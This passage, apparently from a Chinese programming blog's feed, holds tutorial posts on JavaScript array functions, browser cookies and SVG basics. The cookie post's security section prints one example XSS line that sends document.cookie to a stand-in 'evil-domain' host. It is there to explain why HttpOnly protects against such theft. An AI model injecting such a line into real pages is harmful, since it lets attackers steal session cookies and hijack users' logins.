class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">101</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">10</span>], <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>为了实现这个效果，我们可以将传入的所有数组扁平化，然后去重，因为只能传入数组，这时候我们直接设置 strict 为 true，就可以跳过传入的非数组的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关于 unique 可以查看《JavaScript专题之数组去重》[](https://github.com/mqyqingfeng/Blog/issues/27)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_.union = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unique(flatten(<span class="built_in">arguments</span>, <span class="literal">true</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="difference"><a href="#difference" class="headerlink" title="_.difference"></a>_.difference</h2><p>是不是感觉折腾 strict 有点用处了，我们再看一个 _.difference：</p><p>语法为：</p><blockquote><p>_.difference(array, *others)</p></blockquote><p>效果是取出来自 array 数组，并且不存在于多个 other 数组的元素。跟 _.union 一样，都会排除掉不是数组的元素。</p><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.difference([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">5</span>, <span class="number">2</span>, <span class="number">10</span>], [<span class="number">4</span>], <span class="number">3</span>);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>实现方法也很简单，扁平 others 的数组，筛选出 array 中不在扁平化数组中的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">difference</span>(<span class="params">array, ...rest</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    rest = flatten(rest, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rest.indexOf(item) === <span class="number">-1</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，以上实现的细节并不是完全按照 underscore，具体细节的实现感兴趣可以<a href="https://github.com/jashkenas/underscore/blob/master/underscore.js#L528" target="_blank" rel="noopener">查看源码</a>。</p><p>本文转载自：<br>JavaScript专题系列目录地址：<a href="https://github.com/mqyqingfeng/Blog" target="_blank" rel="noopener">https://github.com/mqyqingfeng/Blog</a>。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="js" scheme="https://jiuylq.github.io/categories/js/"/>
    
    
      <category term="Array" scheme="https://jiuylq.github.io/tags/Array/"/>
    
  </entry>
  
  <entry>
    <title>cookie 知识小记</title>
    <link href="https://jiuylq.github.io/2019/03/07/cookie/"/>
    <id>https://jiuylq.github.io/2019/03/07/cookie/</id>
    <published>2019-03-06T16:00:00.000Z</published>
    <updated>2019-04-27T16:07:29.977Z</updated>
    
    <content type="html"><![CDATA[<p>cookie 知识小记<br>日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="cookie-知识小记"><a href="#cookie-知识小记" class="headerlink" title="cookie 知识小记"></a>cookie 知识小记</h2><h3 id="什么是-cookie"><a href="#什么是-cookie" class="headerlink" title="什么是 cookie"></a>什么是 <code>cookie</code></h3><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。（摘自<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">MDN</a>）</p><h3 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a>主要用途</h3><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）  </li><li>个性化设置（如用户自定义设置、主题等）  </li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><blockquote><p><code>cookie</code>大小： 4KB</p></blockquote><ul><li><p>规范中限定每个域名下不超过 20 个 cookie，早期的浏览器都遵循该规范，并且在 IE7 中有更近一步的提升。在微软的一次更新中，他们在 IE7 中增加 cookie 的限制数量到 50 个，与此同时 Opera 限定 cookie 数量为 30 个，Safari 和 Chrome 对与每个域名下的 cookie 个数没有限制。</p></li><li><p>发向服务器的所有 cookie 的最大数量（空间）仍旧维持原始规范中所指出的：4KB。所有超出该限制的 cookie 都会被截掉并且不会发送至服务器。</p></li></ul><h3 id="cookie的基本操作"><a href="#cookie的基本操作" class="headerlink" title="cookie的基本操作"></a><code>cookie</code>的基本操作</h3><p>简单添加<code>cookie</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value"</span></span><br></pre></td></tr></table></figure></p><h4 id="cookie的属性"><a href="#cookie的属性" class="headerlink" title="cookie的属性"></a>cookie的属性</h4><blockquote><p>cookie中的属性是以分号<code>;</code>分隔，以<code>key=value</code>键值对的方式存在</p></blockquote><ul><li><code>name</code>,<code>value</code><br>  <code>name</code> cookie 的名，一个域名下绑定的cookie，name不能相同，相同的name的值会被覆盖掉<br>  <code>value</code> cookie 的值<br>  <strong>规范中明确指出cookie的名/值中的三个字符必须进行编码：分号、逗号和空格</strong>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value"</span></span><br></pre></td></tr></table></figure></li></ul><p>以下为可选属性：  </p><ul><li><p><code>expires</code><br>  <code>expires</code> cookie 的过期时间， 如果没有定义，cookie会在对话结束时过期，格式参见<code>Date.toUTCString()</code>（<code>expires=date-in-GMTString-format</code>）,现在已经被<code>max-age</code>属性所取代   </p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// days天数</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d.setTime(d.getTime() + (days * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>));</span><br><span class="line"><span class="comment">// expires=Thu, 01 Jan 1970 00:00:00 GMT</span></span><br><span class="line"><span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + value + <span class="string">"; "</span> + <span class="string">"expires="</span> + d.toUTCString();</span><br></pre></td></tr></table></figure></li><li><p><code>max-age</code><br>  <code>max-age</code> cookie 的有效期，单位秒，格式(<code>max-age=max-age-in-seconds</code>)  </p><ul><li><code>max-age</code>为正数时，cookie会在<code>max-age</code>秒之后，被删除  </li><li>当<code>max-age</code>为负数时，表示的是临时储存，不会生出cookie文件，只会存在浏览器内存中，且只会在打开的浏览器窗口或者子窗口有效，一旦浏览器关闭，cookie就会消失  </li><li>当<code>max-age</code>为0时，又会发生什么呢，删除cookie，因为cookie机制本身没有设置删除cookie，失效的cookie会被浏览器自动从内存中删除，所以，它实现的就是让cookie失效  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'user=TG;max-age=60*60*24'</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>domain</code><br>  <code>domain</code> 指定Cookie所在的域名，比如example.com，如果指定了一个域，那么子域也包含在内，默认为当前文档位置的路径的域名部分，</p><blockquote><p>所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器  </p></blockquote>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value;domain=example.com"</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>path</code><br>  <code>path</code> 属性用来指定路径（比如/、/mydir），如果未指定，默认为当前文档位置的路径。 (<code>path=path</code>)  </p><blockquote><p>IE 浏览器(ie6、ie7 和 ie8) 不支持 max-age，所有的浏览器都支持 expires</p></blockquote><blockquote><p>只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。  </p></blockquote>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value;path=/"</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>secure</code><br>  <code>secure</code> 属性用来指定Cookie只能在加密协议HTTPS下发送到服务器  </p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'test=hello;secure=true'</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>HttpOnly</code><br>  <code>HttpOnly</code> 属性设为true时，将不能通过js脚本来获取带有 HttpOnly 标记的Cookie，能有效的防止xss攻击。</p></li></ul><h3 id="常用方法的实现（setCookie-getCookie-removeCookie）"><a href="#常用方法的实现（setCookie-getCookie-removeCookie）" class="headerlink" title="常用方法的实现（setCookie,getCookie,removeCookie）"></a>常用方法的实现（setCookie,getCookie,removeCookie）</h3><p>1、<code>setCookie</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc  设置Cookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; value</span></span><br><span class="line"><span class="comment"> * @param &#123;Object&#125; opts</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, opts</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// opts: &#123;,</span></span><br><span class="line">    <span class="comment">//     'domain': '',</span></span><br><span class="line">    <span class="comment">//     'path': '',</span></span><br><span class="line">    <span class="comment">//     'expires': '',</span></span><br><span class="line">    <span class="comment">//     'maxAage': '',</span></span><br><span class="line">    <span class="comment">//     'secure': ''</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// 对name和value进行编码</span></span><br><span class="line">    value = <span class="built_in">encodeURIComponent</span>(<span class="built_in">String</span>(value)).replace(<span class="regexp">/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g</span>, <span class="built_in">decodeURIComponent</span>);</span><br><span class="line">name = <span class="built_in">encodeURIComponent</span>(<span class="built_in">String</span>(name)).replace(<span class="regexp">/%(23|24|26|2B|5E|60|7C)/g</span>, <span class="built_in">decodeURIComponent</span>).replace(<span class="regexp">/[\(\)]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">    <span class="keyword">var</span> options =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> (opts) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.expires &amp;&amp; <span class="keyword">typeof</span> opts.expires === <span class="string">'number'</span>) &#123;</span><br><span class="line">            opts.expires = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="keyword">new</span> <span class="built_in">Date</span>() * <span class="number">1</span> + opts.expires * <span class="number">864e+5</span>).toUTCString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> opts) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!opts[i]) <span class="keyword">continue</span></span><br><span class="line">            options += <span class="string">';'</span> + i</span><br><span class="line">            options += <span class="string">'='</span> + opts[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">'='</span> + value + options;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、<code>getCookie</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc getCookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/(%[0-9A-Z]&#123;2&#125;)+/g</span>, <span class="built_in">decodeURIComponent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">    <span class="keyword">var</span> keyVal = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; cookies.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> part = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line">        <span class="keyword">if</span> (decode(part[<span class="number">0</span>]) === name) &#123;</span><br><span class="line">            keyVal[name] = decode(part[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> name ? keyVal[name] : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、<code>removeCookie</code>  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc getCookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    setCookie(name, <span class="number">1</span>, &#123;<span class="string">'expires'</span>: <span class="number">-1</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MDN示例</strong>  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*\</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  :: cookies.js ::</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  A complete cookies reader/writer framework with full unicode support.</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  This framework is released under the GNU Public License, version 3 or later.</span></span><br><span class="line"><span class="comment">|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  Syntaxes:</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span></span><br><span class="line"><span class="comment">|*|  * docCookies.getItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.removeItem(name[, path], domain)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.hasItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.keys()</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">\*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> docCookies = &#123;</span><br><span class="line">  getItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:(?:^|.*;)\\s*"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\=\\s*([^;]*).*$)|^.*$"</span>), <span class="string">"$1"</span>)) || <span class="literal">null</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  setItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || <span class="regexp">/^(?:expires|max\-age|path|domain|secure)$/i</span>.test(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="keyword">var</span> sExpires = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (vEnd) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (vEnd.constructor) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Number</span>:</span><br><span class="line">          sExpires = vEnd === <span class="literal">Infinity</span> ? <span class="string">"; expires=Fri, 31 Dec 9999 23:59:59 GMT"</span> : <span class="string">"; max-age="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">String</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Date</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd.toUTCString();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(sValue) + sExpires + (sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + (sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>) + (bSecure ? <span class="string">"; secure"</span> : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || !<span class="keyword">this</span>.hasItem(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"=; expires=Thu, 01 Jan 1970 00:00:00 GMT"</span> + ( sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + ( sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  hasItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie);</span><br><span class="line">  &#125;,</span><br><span class="line">  keys: <span class="comment">/* optional method: you can safely remove it! */</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> aKeys = <span class="built_in">document</span>.cookie.replace(<span class="regexp">/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g</span>, <span class="string">""</span>).split(<span class="regexp">/\s*(?:\=[^;]*)?;\s*/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> nIdx = <span class="number">0</span>; nIdx &lt; aKeys.length; nIdx++) &#123; aKeys[nIdx] = <span class="built_in">decodeURIComponent</span>(aKeys[nIdx]); &#125;</span><br><span class="line">    <span class="keyword">return</span> aKeys;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取.</p><p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击.</p><blockquote><p>参考资料：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">MDN</a>  </li><li><a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">js-cookie</a>  </li><li><a href="https://www.kancloud.cn/kancloud/http-cookies-explained/48333" target="_blank" rel="noopener">HTTP cookie详解</a></li><li><a href="https://www.kancloud.cn/dennis/tgjavascript/241831" target="_blank" rel="noopener">Javascript 半知半解</a></li></ul></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;cookie 知识小记&lt;br&gt;日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Javascript" scheme="https://jiuylq.github.io/categories/Javascript/"/>
    
    
      <category term="Javascript" scheme="https://jiuylq.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>SVG 入门</title>
    <link href="https://jiuylq.github.io/2018/12/13/SVG/"/>
    <id>https://jiuylq.github.io/2018/12/13/SVG/</id>
    <published>2018-12-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:15:36.115Z</updated>
    
    <content type="html"><![CDATA[<p>SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言<br><a id="more"></a></p><the rest of contents | 余下全文><h1 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言。</p><!-- more --><blockquote><p>优势：<br>　　SVG 可被非常多的工具读取和修改（比如记事本）<br>　　SVG 与 JPEG 和 GIF 图像比起来，尺寸更小，且可压缩性更强。<br>　　SVG 是可伸缩的<br>　　SVG 图像可在任何的分辨率下被高质量地打印<br>　　SVG 可在图像质量不下降的情况下被放大<br>　　SVG 图像中的文本是可选的，同时也是可搜索的（很适合制作地图）<br>　　SVG 可以与 Java 技术一起运行<br>　　SVG 是开放的标准<br>　　SVG 文件是纯粹的 XML  </p></blockquote><p><a href="https://caniuse.com/#search=svg" title="Click to see SVG compatibility" target="_blank" rel="noopener">兼容性</a></p><p><em>SVG 于 2003 年 1 月 14 日成为 W3C 推荐标准。</em></p><h2 id="二、SVG-实例"><a href="#二、SVG-实例" class="headerlink" title="二、SVG 实例"></a>二、SVG 实例</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"100"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"40"</span> <span class="attr">stroke</span>=<span class="string">"black"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">fill</span>=<span class="string">"red"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析：<br>　　第一行包含了 XML 声明。请注意 standalone 属性！该属性规定此 SVG 文件是否是”独立的”，或含有对外部文件的引用。standalone=”no” 意味着 SVG 文档会引用一个外部文件 - 在这里，是 DTD 文件。<br>　　第二和第三行引用了这个外部的 SVG DTD。该 DTD 位于 “<a href="http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;。该" target="_blank" rel="noopener">http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;。该</a> DTD 位于 W3C，含有所有允许的 SVG 